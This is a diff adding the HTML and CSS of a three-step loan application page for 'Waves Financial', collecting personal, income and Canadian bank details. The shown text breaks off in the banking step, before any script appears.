@@ -1,0 +1,1224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Apply Now — Waves Financial</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;500;600;700;800&family=DM+Sans:ital,wght@0,300;0,400;0,500;0,600;1,300&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --deep:       #0D0B1F;
+    --navy:       #100E2E;
+    --violet:     #1E1650;
+    --indigo:     #2D2580;
+    --royal:      #3B35B0;
+    --iris:       #5B52D8;
+    --lavender:   #7B74F0;
+    --periwinkle: #A09AF5;
+    --mist:       #D4D1FB;
+    --cyan:       #00E5FF;
+    --teal:       #1DE9C6;
+    --gold:       #FFD166;
+    --white:      #FFFFFF;
+    --off-white:  #F4F3FF;
+    --text-muted: #9B97C5;
+    --card-bg:    rgba(30,22,80,0.55);
+    --glass:      rgba(91,82,216,0.12);
+    --border:     rgba(160,154,245,0.18);
+    --border-focus: rgba(160,154,245,0.6);
+    --input-bg:   rgba(13,11,31,0.6);
+    --error:      #FF6B8A;
+    --success:    #1DE9C6;
+    --font-display: 'Syne', sans-serif;
+    --font-body:    'DM Sans', sans-serif;
+    --r-sm: 10px;
+    --r-md: 16px;
+    --r-lg: 24px;
+    --r-xl: 36px;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+  body {
+    font-family: var(--font-body);
+    background: var(--deep);
+    color: var(--white);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* BG */
+  body::before {
+    content: '';
+    position: fixed; inset: 0; z-index: 0;
+    background:
+      radial-gradient(ellipse 70% 50% at 15% 0%, rgba(59,53,176,0.3) 0%, transparent 60%),
+      radial-gradient(ellipse 50% 40% at 85% 10%, rgba(0,229,255,0.09) 0%, transparent 50%),
+      var(--deep);
+    pointer-events: none;
+  }
+
+  /* ─── NAVBAR ─── */
+  nav {
+    position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+    background: rgba(13,11,31,0.85);
+    backdrop-filter: blur(20px);
+    border-bottom: 1px solid var(--border);
+    padding: 0 24px;
+  }
+  .nav-inner {
+    max-width: 1100px; margin: 0 auto;
+    display: flex; align-items: center; justify-content: space-between;
+    height: 64px;
+  }
+  .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
+  .logo svg { width: 34px; height: 34px; }
+  .logo-text {
+    font-family: var(--font-display); font-weight: 700; font-size: 1.15rem;
+    letter-spacing: -0.02em;
+    background: linear-gradient(135deg, #fff 0%, var(--periwinkle) 100%);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  }
+  .nav-back {
+    display: flex; align-items: center; gap: 6px;
+    color: var(--text-muted); text-decoration: none; font-size: 0.875rem;
+    transition: color 0.2s;
+  }
+  .nav-back:hover { color: var(--white); }
+  .nav-secure {
+    display: flex; align-items: center; gap: 6px;
+    font-size: 0.78rem; color: var(--text-muted);
+  }
+  .nav-secure span { color: var(--teal); font-weight: 600; }
+
+  /* ─── MAIN LAYOUT ─── */
+  .page {
+    position: relative; z-index: 1;
+    min-height: 100vh;
+    padding: 100px 24px 60px;
+    display: flex; flex-direction: column; align-items: center;
+  }
+
+  /* ─── PROGRESS HEADER ─── */
+  .progress-wrap {
+    width: 100%; max-width: 640px;
+    margin-bottom: 36px;
+  }
+  .progress-top {
+    display: flex; justify-content: space-between; align-items: center;
+    margin-bottom: 12px;
+  }
+  .progress-label {
+    font-family: var(--font-display); font-size: 0.78rem;
+    font-weight: 700; letter-spacing: 0.1em;
+    text-transform: uppercase; color: var(--periwinkle);
+  }
+  .progress-counter { font-size: 0.78rem; color: var(--text-muted); }
+
+  .step-dots {
+    display: flex; align-items: center; gap: 0;
+    width: 100%;
+  }
+  .step-dot-wrap {
+    display: flex; align-items: center; flex: 1;
+  }
+  .step-dot-wrap:last-child { flex: 0; }
+  .step-dot {
+    width: 32px; height: 32px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-family: var(--font-display); font-size: 0.75rem; font-weight: 700;
+    border: 2px solid var(--border);
+    background: var(--input-bg);
+    color: var(--text-muted);
+    transition: all 0.4s ease;
+    flex-shrink: 0; position: relative; z-index: 1;
+  }
+  .step-dot.active {
+    border-color: var(--iris);
+    background: rgba(91,82,216,0.3);
+    color: var(--white);
+    box-shadow: 0 0 20px rgba(91,82,216,0.4);
+  }
+  .step-dot.done {
+    border-color: var(--teal);
+    background: rgba(29,233,198,0.15);
+    color: var(--teal);
+  }
+  .step-dot.done::after {
+    content: '✓';
+    font-size: 0.85rem;
+  }
+  .step-dot.done .dot-num { display: none; }
+  .step-line {
+    flex: 1; height: 2px;
+    background: var(--border);
+    margin: 0 4px;
+    transition: background 0.4s ease;
+  }
+  .step-line.done { background: linear-gradient(90deg, var(--iris), var(--teal)); }
+
+  .step-labels {
+    display: flex; justify-content: space-between;
+    margin-top: 8px;
+  }
+  .step-label-item {
+    font-size: 0.72rem; color: var(--text-muted);
+    text-align: center; flex: 1;
+    transition: color 0.3s;
+  }
+  .step-label-item:last-child { text-align: right; }
+  .step-label-item:first-child { text-align: left; }
+  .step-label-item.active { color: var(--periwinkle); font-weight: 600; }
+  .step-label-item.done { color: var(--teal); }
+
+  /* ─── FORM CARD ─── */
+  .form-card {
+    width: 100%; max-width: 640px;
+    background: var(--card-bg);
+    backdrop-filter: blur(24px);
+    border: 1px solid var(--border);
+    border-radius: var(--r-xl);
+    padding: 44px 48px;
+    box-shadow: 0 32px 80px rgba(13,11,31,0.6),
+                inset 0 1px 0 rgba(255,255,255,0.05);
+    position: relative; overflow: hidden;
+  }
+  .form-card::before {
+    content: '';
+    position: absolute; top: 0; left: 0; right: 0; height: 1px;
+    background: linear-gradient(90deg, transparent, var(--iris), var(--teal), transparent);
+  }
+
+  /* Step panels */
+  .step-panel { display: none; animation: fadeSlide 0.4s ease; }
+  .step-panel.active { display: block; }
+  @keyframes fadeSlide {
+    from { opacity: 0; transform: translateX(20px); }
+    to   { opacity: 1; transform: translateX(0); }
+  }
+  .step-panel.back { animation: fadeSlideBack 0.4s ease; }
+  @keyframes fadeSlideBack {
+    from { opacity: 0; transform: translateX(-20px); }
+    to   { opacity: 1; transform: translateX(0); }
+  }
+
+  .step-heading {
+    font-family: var(--font-display);
+    font-size: 1.6rem; font-weight: 800;
+    letter-spacing: -0.02em; margin-bottom: 6px;
+    line-height: 1.2;
+  }
+  .step-subhead {
+    font-size: 0.9rem; color: var(--text-muted);
+    margin-bottom: 32px; line-height: 1.6;
+  }
+
+  /* ─── LOAN SUMMARY CHIP ─── */
+  .loan-chip {
+    display: inline-flex; align-items: center; gap: 10px;
+    padding: 10px 18px; border-radius: 100px;
+    background: rgba(91,82,216,0.2);
+    border: 1px solid rgba(160,154,245,0.3);
+    margin-bottom: 28px;
+  }
+  .loan-chip-amount {
+    font-family: var(--font-display); font-size: 1.1rem; font-weight: 800;
+    background: linear-gradient(135deg, var(--white), var(--periwinkle));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  }
+  .loan-chip-label { font-size: 0.78rem; color: var(--text-muted); }
+  .loan-chip-edit {
+    font-size: 0.72rem; color: var(--periwinkle);
+    cursor: pointer; text-decoration: underline;
+    background: none; border: none; padding: 0;
+    font-family: var(--font-body);
+  }
+
+  /* ─── FIELDS ─── */
+  .field-grid {
+    display: grid; gap: 16px;
+    margin-bottom: 28px;
+  }
+  .field-grid-2 { grid-template-columns: 1fr 1fr; }
+  .field-grid-3 { grid-template-columns: 1fr 1fr 1fr; }
+
+  .field { display: flex; flex-direction: column; gap: 6px; }
+  .field-label {
+    font-size: 0.78rem; font-weight: 600;
+    color: var(--text-muted); letter-spacing: 0.04em;
+    text-transform: uppercase;
+  }
+  .field-label .required { color: var(--error); margin-left: 2px; }
+
+  .field-input, .field-select {
+    width: 100%; padding: 13px 16px;
+    background: var(--input-bg);
+    border: 1px solid var(--border);
+    border-radius: var(--r-sm);
+    color: var(--white);
+    font-family: var(--font-body); font-size: 0.9rem;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+    -webkit-appearance: none;
+  }
+  .field-input::placeholder { color: rgba(155,151,197,0.5); }
+  .field-input:focus, .field-select:focus {
+    border-color: var(--border-focus);
+    background: rgba(13,11,31,0.8);
+    box-shadow: 0 0 0 3px rgba(91,82,216,0.15);
+  }
+  .field-input.error, .field-select.error {
+    border-color: var(--error);
+    box-shadow: 0 0 0 3px rgba(255,107,138,0.1);
+  }
+  .field-select option { background: var(--navy); color: var(--white); }
+
+  .field-error {
+    font-size: 0.72rem; color: var(--error);
+    display: none; margin-top: 2px;
+  }
+  .field-error.visible { display: block; }
+
+  .field-hint {
+    font-size: 0.72rem; color: var(--text-muted);
+    margin-top: 2px; line-height: 1.5;
+  }
+
+  /* SIN field with toggle */
+  .sin-wrap { position: relative; }
+  .sin-wrap .field-input { padding-right: 44px; letter-spacing: 0.1em; }
+  .sin-toggle {
+    position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+    background: none; border: none; cursor: pointer;
+    color: var(--text-muted); padding: 4px;
+    transition: color 0.2s;
+  }
+  .sin-toggle:hover { color: var(--periwinkle); }
+
+  /* Radio group */
+  .radio-group {
+    display: grid; gap: 10px;
+  }
+  .radio-group-2 { grid-template-columns: 1fr 1fr; }
+  .radio-group-4 { grid-template-columns: repeat(2, 1fr); }
+  .radio-option {
+    position: relative; cursor: pointer;
+  }
+  .radio-option input { position: absolute; opacity: 0; width: 0; height: 0; }
+  .radio-label {
+    display: flex; align-items: center; gap: 10px;
+    padding: 12px 16px; border-radius: var(--r-sm);
+    border: 1px solid var(--border);
+    background: var(--input-bg);
+    font-size: 0.875rem; color: var(--text-muted);
+    transition: all 0.2s; cursor: pointer;
+  }
+  .radio-dot {
+    width: 16px; height: 16px; border-radius: 50%;
+    border: 2px solid var(--border);
+    flex-shrink: 0;
+    transition: all 0.2s;
+  }
+  .radio-option input:checked + .radio-label {
+    border-color: var(--iris);
+    background: rgba(91,82,216,0.2);
+    color: var(--white);
+  }
+  .radio-option input:checked + .radio-label .radio-dot {
+    border-color: var(--iris);
+    background: var(--iris);
+    box-shadow: 0 0 8px rgba(91,82,216,0.5);
+  }
+
+  /* Employer name (conditional) */
+  #employer-wrap { transition: all 0.3s ease; overflow: hidden; }
+
+  /* ─── SECURITY BADGE ─── */
+  .security-note {
+    display: flex; align-items: center; gap: 8px;
+    padding: 12px 16px; border-radius: var(--r-sm);
+    background: rgba(29,233,198,0.06);
+    border: 1px solid rgba(29,233,198,0.15);
+    margin-bottom: 24px;
+  }
+  .security-note-icon { font-size: 0.9rem; }
+  .security-note-text { font-size: 0.78rem; color: rgba(29,233,198,0.8); line-height: 1.5; }
+
+  /* ─── NAVIGATION BUTTONS ─── */
+  .form-actions {
+    display: flex; gap: 12px; align-items: center;
+    justify-content: space-between;
+  }
+  .btn-back {
+    display: flex; align-items: center; gap: 6px;
+    padding: 13px 22px; border-radius: var(--r-sm);
+    border: 1px solid var(--border);
+    background: transparent; color: var(--text-muted);
+    font-family: var(--font-body); font-size: 0.875rem; font-weight: 500;
+    cursor: pointer; text-decoration: none;
+    transition: all 0.2s;
+  }
+  .btn-back:hover { border-color: var(--lavender); color: var(--white); }
+
+  .btn-next {
+    flex: 1; padding: 14px 28px; border-radius: var(--r-sm);
+    background: linear-gradient(135deg, var(--royal) 0%, var(--iris) 100%);
+    color: var(--white); border: none; cursor: pointer;
+    font-family: var(--font-display); font-size: 0.95rem; font-weight: 700;
+    box-shadow: 0 6px 24px rgba(91,82,216,0.4);
+    transition: all 0.25s;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+  }
+  .btn-next:hover { transform: translateY(-1px); box-shadow: 0 10px 32px rgba(91,82,216,0.55); }
+  .btn-next:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+  .btn-submit {
+    flex: 1; padding: 14px 28px; border-radius: var(--r-sm);
+    background: linear-gradient(135deg, var(--teal) 0%, var(--cyan) 100%);
+    color: var(--deep); border: none; cursor: pointer;
+    font-family: var(--font-display); font-size: 0.95rem; font-weight: 800;
+    box-shadow: 0 6px 24px rgba(0,229,255,0.3);
+    transition: all 0.25s;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+  }
+  .btn-submit:hover { transform: translateY(-2px); box-shadow: 0 10px 36px rgba(0,229,255,0.45); }
+  .btn-submit:disabled {
+    opacity: 0.6; cursor: not-allowed; transform: none;
+    background: rgba(29,233,198,0.3); color: var(--text-muted);
+  }
+
+  /* Spinner */
+  .spinner {
+    width: 18px; height: 18px; border-radius: 50%;
+    border: 2px solid rgba(13,11,31,0.3);
+    border-top-color: var(--deep);
+    animation: spin 0.7s linear infinite; display: none;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* ─── CONSENT ─── */
+  .consent-wrap { margin-bottom: 20px; }
+  .consent-label {
+    display: flex; gap: 12px; cursor: pointer;
+    align-items: flex-start;
+  }
+  .consent-label input { display: none; }
+  .consent-box {
+    width: 18px; height: 18px; border-radius: 4px;
+    border: 2px solid var(--border); flex-shrink: 0;
+    background: var(--input-bg); margin-top: 2px;
+    transition: all 0.2s;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .consent-label input:checked + .consent-box {
+    background: var(--iris); border-color: var(--iris);
+  }
+  .consent-label input:checked + .consent-box::after {
+    content: '✓'; font-size: 0.7rem; color: white; font-weight: 700;
+  }
+  .consent-text {
+    font-size: 0.78rem; color: var(--text-muted); line-height: 1.6;
+  }
+  .consent-text a { color: var(--periwinkle); text-decoration: none; }
+  .consent-text a:hover { text-decoration: underline; }
+
+  /* ─── SUCCESS SCREEN ─── */
+  #success-screen {
+    display: none; text-align: center;
+    padding: 20px 0;
+  }
+  .success-icon {
+    width: 80px; height: 80px; border-radius: 50%;
+    background: linear-gradient(135deg, rgba(29,233,198,0.2), rgba(0,229,255,0.1));
+    border: 2px solid rgba(29,233,198,0.4);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 2rem; margin: 0 auto 24px;
+    box-shadow: 0 0 40px rgba(29,233,198,0.2);
+    animation: successPop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+  }
+  @keyframes successPop {
+    from { transform: scale(0); opacity: 0; }
+    to   { transform: scale(1); opacity: 1; }
+  }
+  .success-title {
+    font-family: var(--font-display); font-size: 1.8rem;
+    font-weight: 800; margin-bottom: 12px;
+    background: linear-gradient(135deg, var(--white), var(--teal));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  }
+  .success-sub {
+    font-size: 0.95rem; color: var(--text-muted);
+    line-height: 1.7; margin-bottom: 28px; max-width: 420px; margin-left: auto; margin-right: auto;
+  }
+  .success-ref {
+    display: inline-flex; align-items: center; gap: 8px;
+    padding: 10px 20px; border-radius: 100px;
+    background: rgba(91,82,216,0.2);
+    border: 1px solid rgba(160,154,245,0.3);
+    font-size: 0.85rem; color: var(--periwinkle);
+    margin-bottom: 28px;
+  }
+  .success-ref strong { color: var(--white); font-family: var(--font-display); }
+  .success-steps {
+    display: grid; gap: 12px; text-align: left;
+    background: rgba(13,11,31,0.4);
+    border: 1px solid var(--border);
+    border-radius: var(--r-md); padding: 20px;
+    margin-bottom: 24px;
+  }
+  .success-step {
+    display: flex; align-items: flex-start; gap: 12px;
+    font-size: 0.85rem; color: var(--text-muted); line-height: 1.5;
+  }
+  .success-step-num {
+    width: 22px; height: 22px; border-radius: 50%; flex-shrink: 0;
+    background: rgba(91,82,216,0.3); border: 1px solid rgba(160,154,245,0.3);
+    font-size: 0.7rem; font-weight: 700; color: var(--periwinkle);
+    display: flex; align-items: center; justify-content: center;
+  }
+
+  /* ─── TRUST STRIP ─── */
+  .trust-strip {
+    display: flex; align-items: center; justify-content: center;
+    gap: 20px; flex-wrap: wrap;
+    margin-top: 24px; padding-top: 20px;
+    border-top: 1px solid var(--border);
+  }
+  .trust-item {
+    display: flex; align-items: center; gap: 6px;
+    font-size: 0.72rem; color: var(--text-muted);
+  }
+  .trust-item-icon { font-size: 0.85rem; }
+
+  /* ─── RESPONSIVE ─── */
+  @media (max-width: 680px) {
+    .form-card { padding: 32px 24px; border-radius: var(--r-lg); }
+    .field-grid-2, .field-grid-3 { grid-template-columns: 1fr; }
+    .radio-group-2, .radio-group-4 { grid-template-columns: 1fr 1fr; }
+    .step-heading { font-size: 1.35rem; }
+  }
+  @media (max-width: 420px) {
+    .radio-group-4 { grid-template-columns: 1fr; }
+    .form-card { padding: 28px 18px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- NAVBAR -->
+<nav>
+  <div class="nav-inner">
+    <a href="index.html" class="logo">
+      <svg viewBox="0 0 38 38" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <linearGradient id="lg1" x1="0" y1="0" x2="38" y2="38" gradientUnits="userSpaceOnUse">
+            <stop offset="0%" stop-color="#5B52D8"/><stop offset="100%" stop-color="#00E5FF"/>
+          </linearGradient>
+          <linearGradient id="lg2" x1="0" y1="38" x2="38" y2="0" gradientUnits="userSpaceOnUse">
+            <stop offset="0%" stop-color="#1DE9C6"/><stop offset="100%" stop-color="#5B52D8"/>
+          </linearGradient>
+        </defs>
+        <path d="M4 24 C7 18, 10 14, 13 18 C16 22, 17 26, 19 22 C21 18, 22 14, 25 18 C28 22, 31 18, 34 14" stroke="url(#lg1)" stroke-width="3" stroke-linecap="round" fill="none"/>
+        <path d="M4 30 C7 24, 10 20, 13 24 C16 28, 17 32, 19 28 C21 24, 22 20, 25 24 C28 28, 31 24, 34 20" stroke="url(#lg2)" stroke-width="2.5" stroke-linecap="round" fill="none" opacity="0.6"/>
+        <circle cx="33" cy="10" r="3.5" fill="url(#lg1)"/>
+      </svg>
+      <span class="logo-text">Waves Financial</span>
+    </a>
+    <div class="nav-secure">
+      <span>🔒</span>
+      <span><span>256-bit SSL</span> Encrypted</span>
+    </div>
+    <a href="index.html" class="nav-back">← Back to home</a>
+  </div>
+</nav>
+
+<!-- MAIN -->
+<main class="page">
+
+  <!-- PROGRESS -->
+  <div class="progress-wrap">
+    <div class="progress-top">
+      <span class="progress-label" id="progress-label">Step 1 — Personal Info</span>
+      <span class="progress-counter" id="progress-counter">1 of 3</span>
+    </div>
+    <div class="step-dots">
+      <div class="step-dot-wrap">
+        <div class="step-dot active" id="dot-1"><span class="dot-num">1</span></div>
+      </div>
+      <div class="step-line" id="line-1"></div>
+      <div class="step-dot-wrap">
+        <div class="step-dot" id="dot-2"><span class="dot-num">2</span></div>
+      </div>
+      <div class="step-line" id="line-2"></div>
+      <div class="step-dot-wrap">
+        <div class="step-dot" id="dot-3"><span class="dot-num">3</span></div>
+      </div>
+    </div>
+    <div class="step-labels">
+      <span class="step-label-item active" id="label-1">Personal</span>
+      <span class="step-label-item" id="label-2">Financial</span>
+      <span class="step-label-item" id="label-3">Banking</span>
+    </div>
+  </div>
+
+  <!-- FORM CARD -->
+  <div class="form-card">
+
+    <!-- ═══ STEP 1: PERSONAL ═══ -->
+    <div class="step-panel active" id="step-1">
+
+      <div class="loan-chip">
+        <span class="loan-chip-amount" id="chip-amount">$750</span>
+        <span class="loan-chip-label">loan requested</span>
+        <button class="loan-chip-edit" onclick="history.back()">Change</button>
+      </div>
+
+      <h1 class="step-heading">Tell us about yourself</h1>
+      <p class="step-subhead">Your information is encrypted and never shared with third parties.</p>
+
+      <div class="field-grid field-grid-2">
+        <div class="field">
+          <label class="field-label">First Name <span class="required">*</span></label>
+          <input type="text" class="field-input" id="first-name" placeholder="John" autocomplete="given-name">
+          <span class="field-error" id="err-first-name">Please enter your first name</span>
+        </div>
+        <div class="field">
+          <label class="field-label">Last Name <span class="required">*</span></label>
+          <input type="text" class="field-input" id="last-name" placeholder="Smith" autocomplete="family-name">
+          <span class="field-error" id="err-last-name">Please enter your last name</span>
+        </div>
+      </div>
+
+      <div class="field-grid field-grid-2">
+        <div class="field">
+          <label class="field-label">Date of Birth <span class="required">*</span></label>
+          <input type="date" class="field-input" id="dob" autocomplete="bday">
+          <span class="field-error" id="err-dob">You must be 18 or older</span>
+        </div>
+        <div class="field">
+          <label class="field-label">Province <span class="required">*</span></label>
+          <select class="field-select" id="province" autocomplete="address-level1">
+            <option value="">Select province…</option>
+            <option value="BC">British Columbia</option>
+            <option value="ON">Ontario</option>
+            <option value="NS">Nova Scotia</option>
+            <option value="NB">New Brunswick</option>
+            <option value="PE">Prince Edward Island</option>
+            <option value="NL">Newfoundland & Labrador</option>
+          </select>
+          <span class="field-error" id="err-province">Please select your province</span>
+        </div>
+      </div>
+
+      <div class="field-grid">
+        <div class="field">
+          <label class="field-label">Street Address <span class="required">*</span></label>
+          <input type="text" class="field-input" id="address" placeholder="123 Main Street" autocomplete="street-address">
+          <span class="field-error" id="err-address">Please enter your address</span>
+        </div>
+      </div>
+
+      <div class="field-grid field-grid-2">
+        <div class="field">
+          <label class="field-label">City <span class="required">*</span></label>
+          <input type="text" class="field-input" id="city" placeholder="Vancouver" autocomplete="address-level2">
+          <span class="field-error" id="err-city">Please enter your city</span>
+        </div>
+        <div class="field">
+          <label class="field-label">Postal Code <span class="required">*</span></label>
+          <input type="text" class="field-input" id="postal" placeholder="V6B 1A1" maxlength="7" autocomplete="postal-code">
+          <span class="field-error" id="err-postal">Enter a valid postal code</span>
+        </div>
+      </div>
+
+      <div class="field-grid field-grid-2">
+        <div class="field">
+          <label class="field-label">Phone Number <span class="required">*</span></label>
+          <input type="tel" class="field-input" id="phone" placeholder="(604) 555-0123" autocomplete="tel">
+          <span class="field-error" id="err-phone">Enter a valid phone number</span>
+        </div>
+        <div class="field">
+          <label class="field-label">Email Address <span class="required">*</span></label>
+          <input type="email" class="field-input" id="email" placeholder="john@email.com" autocomplete="email">
+          <span class="field-error" id="err-email">Enter a valid email address</span>
+        </div>
+      </div>
+
+      <div class="field-grid">
+        <div class="field">
+          <label class="field-label">Social Insurance Number (SIN) <span class="required">*</span></label>
+          <div class="sin-wrap">
+            <input type="password" class="field-input" id="sin" placeholder="000 000 000" maxlength="11" inputmode="numeric">
+            <button type="button" class="sin-toggle" onclick="toggleSIN()" id="sin-toggle-btn" title="Show/hide SIN">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+            </button>
+          </div>
+          <span class="field-error" id="err-sin">Enter a valid 9-digit SIN</span>
+          <span class="field-hint">🔒 Your SIN is encrypted with 256-bit SSL and used only for identity verification.</span>
+        </div>
+      </div>
+
+      <div class="form-actions">
+        <button class="btn-next" onclick="nextStep(1)">
+          Continue to Financial Info
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+        </button>
+      </div>
+    </div>
+
+    <!-- ═══ STEP 2: FINANCIAL ═══ -->
+    <div class="step-panel" id="step-2">
+      <h1 class="step-heading">Your financial info</h1>
+      <p class="step-subhead">We use this to confirm your ability to repay. No credit check required.</p>
+
+      <div class="field-grid" style="margin-bottom:20px;">
+        <div class="field">
+          <label class="field-label">Employment Status <span class="required">*</span></label>
+          <div class="radio-group radio-group-2" style="margin-top:6px;">
+            <label class="radio-option">
+              <input type="radio" name="emp-status" value="employed" onchange="toggleEmployer()">
+              <span class="radio-label"><span class="radio-dot"></span>Employed</span>
+            </label>
+            <label class="radio-option">
+              <input type="radio" name="emp-status" value="self-employed" onchange="toggleEmployer()">
+              <span class="radio-label"><span class="radio-dot"></span>Self-Employed</span>
+            </label>
+            <label class="radio-option">
+              <input type="radio" name="emp-status" value="benefits" onchange="toggleEmployer()">
+              <span class="radio-label"><span class="radio-dot"></span>Benefits / EI</span>
+            </label>
+            <label class="radio-option">
+              <input type="radio" name="emp-status" value="other" onchange="toggleEmployer()">
+              <span class="radio-label"><span class="radio-dot"></span>Other</span>
+            </label>
+          </div>
+          <span class="field-error" id="err-emp-status">Please select your employment status</span>
+        </div>
+      </div>
+
+      <div id="employer-wrap" style="max-height:0; opacity:0; pointer-events:none;">
+        <div class="field-grid" style="margin-bottom:20px;">
+          <div class="field">
+            <label class="field-label">Employer Name</label>
+            <input type="text" class="field-input" id="employer" placeholder="Acme Corp" autocomplete="organization">
+          </div>
+        </div>
+      </div>
+
+      <div class="field-grid field-grid-2">
+        <div class="field">
+          <label class="field-label">Monthly Net Income <span class="required">*</span></label>
+          <input type="number" class="field-input" id="income" placeholder="2500" min="800" inputmode="numeric">
+          <span class="field-error" id="err-income">Minimum income is $800/month</span>
+          <span class="field-hint">After-tax income in CAD</span>
+        </div>
+        <div class="field">
+          <label class="field-label">Pay Frequency <span class="required">*</span></label>
+          <select class="field-select" id="pay-freq">
+            <option value="">Select…</option>
+            <option value="weekly">Weekly</option>
+            <option value="biweekly">Every 2 Weeks</option>
+            <option value="semimonthly">Twice a Month</option>
+            <option value="monthly">Monthly</option>
+          </select>
+          <span class="field-error" id="err-pay-freq">Please select your pay frequency</span>
+        </div>
+      </div>
+
+      <div class="field-grid" style="margin-bottom:8px;">
+        <div class="field">
+          <label class="field-label">Requested Loan Amount <span class="required">*</span></label>
+          <select class="field-select" id="loan-amount">
+            <option value="500">$500</option>
+            <option value="600">$600</option>
+            <option value="700">$700</option>
+            <option value="750" selected>$750</option>
+            <option value="800">$800</option>
+            <option value="900">$900</option>
+            <option value="1000">$1,000</option>
+          </select>
+        </div>
+      </div>
+
+      <div class="form-actions" style="margin-top:28px;">
+        <button class="btn-back" onclick="prevStep(2)">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+          Back
+        </button>
+        <button class="btn-next" onclick="nextStep(2)">
+          Continue to Banking
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+        </button>
+      </div>
+    </div>
+
+    <!-- ═══ STEP 3: BANKING ═══ -->
+    <div class="step-panel" id="step-3">
+      <h1 class="step-heading">Banking details</h1>
+      <p class="step-subhead">Your loan will be deposited to this account via e-Transfer. Repayments are collected here automatically.</p>
+
+      <div class="security-note">
+        <span class="security-note-icon">🔒</span>
+        <span class="security-note-text">Your banking information is encrypted and transmitted securely. We use it solely for deposit and pre-authorized debit repayments as per your agreement.</span>
+      </div>
+
+      <div class="field-grid field-grid-2">
+        <div class="field">
+          <label class="field-label">Bank Name <span class="required">*</span></label>
+          <select class="field-select" id="bank-name">
+            <option value="">Select bank…</option>
+            <option value="RBC">RBC Royal Bank</option>
+            <option value="TD">TD Canada Trust</option>
+            <option value="BMO">BMO Bank of Montreal</option>
+            <option value="CIBC">CIBC</option>
+            <option value="Scotia">Scotiabank</option>
+            <option value="NBC">National Bank</option>
+            <option value="Desjardins">Desjardins</option>
+            <option value="Tangerine">Tangerine</option>
+            <option value="Other">Other</option>
+          </select>
+          <span class="field-error" id="err-bank-name">Please select your bank</span>
+        </div>
+        <div class="field">
+          <label class="field-label">Account Type <span class="required">*</span></label>
+          <div class="radio-group radio-group-2" style="margin-top:6px;">
+            <label class="radio-option">
+              <input type="radio" name="account-type" value="chequing">
+              <span class="radio-label"><span class="radio-dot"></span>Chequing</span>
+            </label>
+            <label class="radio-option">
+              <input type="radio" name="account-type" value="savings">
+              <span class="radio-label"><span class="radio-dot"></span>Savings</span>
+            </label>
+          </div>
+          <span class="field-error" id="err-account-type">Please select account type</span>
+        </div>
+      </div>
+
+      <div class="field-grid field-grid-3">
+        <div class="field">
+          <label class="field-label">Transit No. <span class="required">*</span></label>
+          <input type="text" class="field-input" id="transit" placeholder="00000" maxlength="5" inputmode="numeric">
+          <span class="field-error" id="err-transit">5-digit transit number</span>
+          <span class="field-hint">5 digits</span>
+        </div>
+        <div class="field">
+          <label class="field-label">Institution No. <span class="required">*</span></label>
+          <input type="text" class="field-input" id="institution" placeholder="000" maxlength="3" inputmode="numeric">
+          <span class="field-error" id="err-institution">3-digit institution number</span>
+          <span class="field-hint">3 digits</span>
+        </div>
+        <div class="field">
+          <label class="field-label">Account No. <span class="required">*</span></label>
+          <input type="text" class="field-input" id="account" placeholder="0000000" maxlength="12" inputmode="numeric">
+          <span class="field-error" id="err-account">5–12 digit account number</span>
+          <span class="field-hint">5–12 digits</span>
+        </div>
+      </div>
+
+      <div class="field-hint" style="margin-bottom:24px; padding:12px 14px; background:rgba(160,154,245,0.08); border-radius:var(--r-sm); border:1px solid var(--border);">
+        💡 Find these numbers on your cheque or in your online banking under "Account details."
+      </div>
+
+      <div class="consent-wrap">
+        <label class="consent-label">
+          <input type="checkbox" id="consent-pad">
+          <span class="consent-box"></span>
+          <span class="consent-text">I authorize Waves Financial to initiate pre-authorized debits from the above account for loan repayments as described in the <a href="#">Loan Agreement</a> and <a href="#">PAD Agreement</a>.</span>
+        </label>
+      </div>
+
+      <div class="consent-wrap">
+        <label class="consent-label">
+          <input type="checkbox" id="consent-terms">
+          <span class="consent-box"></span>
+          <span class="consent-text">I have read and agree to the <a href="#">Terms & Conditions</a> and <a href="#">Privacy Policy</a>. I confirm that all information provided is accurate.</span>
+        </label>
+      </div>
+      <span class="field-error" id="err-consent" style="display:none; margin-bottom:16px;">Please accept both agreements to continue</span>
+
+      <div class="form-actions">
+        <button class="btn-back" onclick="prevStep(3)">
